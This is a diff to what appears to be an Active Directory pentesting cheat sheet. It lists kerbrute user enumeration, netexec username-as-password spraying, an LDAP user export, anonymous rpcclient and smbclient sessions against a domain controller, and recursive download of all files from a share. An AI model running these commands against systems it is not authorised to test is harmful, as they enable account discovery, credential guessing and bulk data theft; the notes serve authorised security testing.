@@ -38,6 +38,8 @@ kerbrute userenum --dc $DC_IP -d $DOMAIN users.txt -o valid_users.txt
 # Netexec with validusers 
 netexec smb $DC_IP -u usernames.txt -p usernames.txt --no-bruteforce 
 
+nxc ldap $DC_IP -u $USER -p $PASS --users-export usernames.txt
+
 # Rpcclient
 rpcclient -U "" -N $DC_IP
 rpcclient -U "" -N $DC_IP -c "enumdomusers"
@@ -55,15 +57,16 @@ rpcclient -U <username> $DC_IP
 smbclient -L //$DC_IP -N
 smbclient -L //$DC_IP -U ''%''
 
-smbclient -U 'DOMAIN/$USER%$PASS' //$DC_IP/SHARED-NAME
+smbclient -U 'DOMAIN/$USER%$PASS' //$DC_IP/SHARED-NAME 
 
 smbclient --realm=corp.local 
 
-# SMB Download 
+# SMB All Folders Download 
 > RECURSE on
 > Prompt 
 > mget *
 
+# Use -t 3600, if file size is large to download.
 
 # Enumerate shares
 # Use -k with krb5.conf
